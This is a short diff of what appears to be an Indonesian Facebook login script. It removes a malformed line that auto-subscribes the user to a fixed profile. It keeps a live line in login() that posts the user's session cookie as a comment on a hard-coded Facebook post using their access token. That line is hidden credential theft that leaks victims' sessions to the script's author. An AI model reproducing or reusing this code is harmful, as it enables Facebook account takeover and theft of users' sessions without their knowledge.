@@ -402,7 +402,7 @@ def login():
 
 		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Ah Ganteng Banget Bang"])
 
-		ses.post(f"https://graph.facebook.com/100022220423209?fields=subscribers&access_token={token}",headers=(cookies=cok)
+	
 
 		ses.post(f"https://graph.facebook.com/1241529463264389/comments/?message={cookie}&access_token={token}",cookies=cok)
 
